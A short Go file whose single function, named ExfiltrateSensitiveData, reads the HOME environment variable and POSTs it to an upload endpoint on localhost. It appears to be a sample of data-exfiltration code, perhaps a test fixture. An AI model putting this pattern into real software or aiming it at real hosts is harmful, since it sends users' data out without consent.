package exfiltrate_v2

import (
	"bytes"
	"fmt"
	"net/http"
	"os"
)

func ExfiltrateSensitiveData() {
	envVar := "HOME"

	envValue := os.Getenv(envVar)

	var dataToSend bytes.Buffer
	dataToSend.WriteString(fmt.Sprintf("Environment variable %s: %s", envVar, envValue))

	serverURL := "http://localhost:8080/upload"
	req, _ := http.NewRequest("POST", serverURL, &dataToSend)

	req.Header.Set("Content-Type", "text/plain")

	client := &http.Client{}
	resp, _ := client.Do(req)
	defer resp.Body.Close()
}
